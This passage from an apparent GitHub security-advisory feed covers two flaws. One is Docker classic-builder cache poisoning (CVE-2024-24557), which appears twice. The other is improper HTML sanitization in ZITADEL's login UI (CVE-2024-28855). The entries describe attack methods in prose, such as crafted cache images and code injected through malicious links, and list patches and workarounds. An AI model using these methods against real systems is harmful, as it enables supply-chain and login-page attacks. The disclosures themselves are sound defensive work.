Also, changes to some instructions (most important being <code>HEALTHCHECK</code> and <code>ONBUILD</code>) would not cause a cache miss.</p>
<p>An attacker with the knowledge of the Dockerfile someone is using could poison their cache by making them pull a specially crafted image that would be considered as a valid cache candidate for some build steps.</p>
<p>For example, an attacker could create an image that is considered as a valid cache candidate for:</p>
<pre><code>FROM scratch
MAINTAINER Pawel
</code></pre>
<p>when in fact the malicious image used as a cache would be an image built from a different Dockerfile.</p>
<p>In the second case, the attacker could for example substitute a different <code>HEALTCHECK</code> command.</p>
<h3 id="impact">Impact</h3>
<p>23.0+ users are only affected if they explicitly opted out of Buildkit (<code>DOCKER_BUILDKIT=0</code> environment variable) or are using the <code>/build</code> API endpoint (which uses the classic builder by default).</p>
<p>All users on versions older than 23.0 could be impacted. An example could be a CI with a shared cache, or just a regular Docker user pulling a malicious image due to misspelling/typosquatting.</p>
<p>Image build API endpoint (<code>/build</code>) and <code>ImageBuild</code> function from <code>github.com/docker/docker/client</code> is also affected as it the uses classic builder by default. </p>
<h3 id="patches">Patches</h3>
<p>Patches are included in Moby releases:</p>
<ul>
<li>v25.0.2</li>
<li>v24.0.9</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Use <code>--no-cache</code> or use Buildkit if possible (<code>DOCKER_BUILDKIT=1</code>, it's default on 23.0+ assuming that the buildx plugin is installed).</li>
<li>Use <code>Version = types.BuilderBuildKit</code> or <code>NoCache = true</code> in <code>ImageBuildOptions</code> for <code>ImageBuild</code> call.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-xw73-rw38-6vjc">https://github.com/moby/moby/security/advisories/GHSA-xw73-rw38-6vjc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24557">https://nvd.nist.gov/vuln/detail/CVE-2024-24557</a></li>
<li><a href="https://github.com/moby/moby/commit/3e230cfdcc989dc524882f6579f9e0dac77400ae">https://github.com/moby/moby/commit/3e230cfdcc989dc524882f6579f9e0dac77400ae</a></li>
<li><a href="https://github.com/moby/moby/commit/fca702de7f71362c8d103073c7e4a1d0a467fadd">https://github.com/moby/moby/commit/fca702de7f71362c8d103073c7e4a1d0a467fadd</a></li>
<li><a href="https://github.com/moby/moby/commit/fce6e0ca9bc000888de3daa157af14fa41fcd0ff">https://github.com/moby/moby/commit/fce6e0ca9bc000888de3daa157af14fa41fcd0ff</a></li>
<li><a href="https://github.com/advisories/GHSA-xw73-rw38-6vjc">https://github.com/advisories/GHSA-xw73-rw38-6vjc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw73-rw38-6vjc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-01T20:51:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Classic builder cache poisoning]]></title>
        <id>https://github.com/advisories/GHSA-xw73-rw38-6vjc</id>
        <link href="https://github.com/advisories/GHSA-xw73-rw38-6vjc"/>
        <updated>2024-03-20T17:07:44.000Z</updated>
        <content type="html"><![CDATA[<p>The classic builder cache system is prone to cache poisoning if the image is built <code>FROM scratch</code>.
Also, changes to some instructions (most important being <code>HEALTHCHECK</code> and <code>ONBUILD</code>) would not cause a cache miss.</p>
<p>An attacker with the knowledge of the Dockerfile someone is using could poison their cache by making them pull a specially crafted image that would be considered as a valid cache candidate for some build steps.</p>
<p>For example, an attacker could create an image that is considered as a valid cache candidate for:</p>
<pre><code>FROM scratch
MAINTAINER Pawel
</code></pre>
<p>when in fact the malicious image used as a cache would be an image built from a different Dockerfile.</p>
<p>In the second case, the attacker could for example substitute a different <code>HEALTCHECK</code> command.</p>
<h3 id="impact">Impact</h3>
<p>23.0+ users are only affected if they explicitly opted out of Buildkit (<code>DOCKER_BUILDKIT=0</code> environment variable) or are using the <code>/build</code> API endpoint (which uses the classic builder by default).</p>
<p>All users on versions older than 23.0 could be impacted. An example could be a CI with a shared cache, or just a regular Docker user pulling a malicious image due to misspelling/typosquatting.</p>
<p>Image build API endpoint (<code>/build</code>) and <code>ImageBuild</code> function from <code>github.com/docker/docker/client</code> is also affected as it the uses classic builder by default. </p>
<h3 id="patches">Patches</h3>
<p>Patches are included in Moby releases:</p>
<ul>
<li>v25.0.2</li>
<li>v24.0.9</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Use <code>--no-cache</code> or use Buildkit if possible (<code>DOCKER_BUILDKIT=1</code>, it's default on 23.0+ assuming that the buildx plugin is installed).</li>
<li>Use <code>Version = types.BuilderBuildKit</code> or <code>NoCache = true</code> in <code>ImageBuildOptions</code> for <code>ImageBuild</code> call.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-xw73-rw38-6vjc">https://github.com/moby/moby/security/advisories/GHSA-xw73-rw38-6vjc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-24557">https://nvd.nist.gov/vuln/detail/CVE-2024-24557</a></li>
<li><a href="https://github.com/moby/moby/commit/3e230cfdcc989dc524882f6579f9e0dac77400ae">https://github.com/moby/moby/commit/3e230cfdcc989dc524882f6579f9e0dac77400ae</a></li>
<li><a href="https://github.com/moby/moby/commit/fca702de7f71362c8d103073c7e4a1d0a467fadd">https://github.com/moby/moby/commit/fca702de7f71362c8d103073c7e4a1d0a467fadd</a></li>
<li><a href="https://github.com/moby/moby/commit/fce6e0ca9bc000888de3daa157af14fa41fcd0ff">https://github.com/moby/moby/commit/fce6e0ca9bc000888de3daa157af14fa41fcd0ff</a></li>
<li><a href="https://github.com/advisories/GHSA-xw73-rw38-6vjc">https://github.com/advisories/GHSA-xw73-rw38-6vjc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw73-rw38-6vjc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-01T20:51:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Improper HTML sanitization in ZITADEL]]></title>
        <id>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</id>
        <link href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj"/>
        <updated>2024-03-19T18:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL uses Go templates to render the login UI.</p>
<p>Due to a improper use of the <code>text/template</code> instead of the <code>html/template</code> package, the Login UI did not sanitize input parameters. An attacker could create a malicious link, where he injected code which would be rendered as part of the login screen.
While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by the Content Security Policy.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">2.47.3</a>
2.46.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">2.46.1</a>
2.45.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">2.45.1</a>
2.44.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">2.44.3</a>
2.43.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">2.43.9</a>
2.42.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">2.42.15</a>
2.41.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">2.41.15</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Daniel Philipp - owt and Thomas Wickham - synopsis for reporting this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28855">https://nvd.nist.gov/vuln/detail/CVE-2024-28855</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">https://github.com/zitadel/zitadel/releases/tag/v2.41.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">https://github.com/zitadel/zitadel/releases/tag/v2.42.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">https://github.com/zitadel/zitadel/releases/tag/v2.43.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">https://github.com/zitadel/zitadel/releases/tag/v2.44.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">https://github.com/zitadel/zitadel/releases/tag/v2.45.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">https://github.com/zitadel/zitadel/releases/tag/v2.46.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">https://github.com/zitadel/zitadel/releases/tag/v2.47.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:34:00.000Z</published>
    </entry>
</feed>